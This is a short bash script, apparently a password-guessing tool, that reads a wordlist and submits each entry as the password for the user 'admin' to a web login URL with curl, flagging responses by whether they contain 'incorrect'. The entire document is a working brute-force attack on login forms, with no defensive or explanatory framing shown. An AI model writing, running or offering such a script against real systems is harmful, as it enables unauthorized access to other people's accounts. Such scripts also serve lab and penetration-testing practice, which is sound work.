
#!/bin/bash

while read line; do
	counter=$(curl --silent --data "username=admin" --data "password=$line" $1 | grep -c "incorrect")
	echo "[" $counter "]" $line
done <$2
